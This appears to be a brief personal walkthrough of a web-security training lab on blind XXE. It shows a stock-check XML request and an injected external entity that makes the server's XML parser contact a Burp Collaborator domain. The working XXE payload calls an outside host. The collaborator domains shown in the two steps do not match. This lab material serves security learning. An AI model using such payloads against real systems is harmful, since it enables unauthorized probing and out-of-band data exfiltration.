# Blind XXE with out-of-band interaction

## This lab has a "Check stock" feature that parses XML input but does not display the result.

## You can detect the [blind XXE] vulnerability by triggering out-of-band interactions with an external domain.

## To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

---

### step 1

interept check stock feature and send to Reapeter

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### step2

go burp collaborator copy to clipboard
dk1jaxnj44bf3s73s2kgyu46bxho5et3.oastify.com
add http://
http://dk1jaxnj44bf3s73s2kgyu46bxho5et3.oastify.com

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://k1mqr44qlbsmkzoa991nf1lds4yvmmab.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
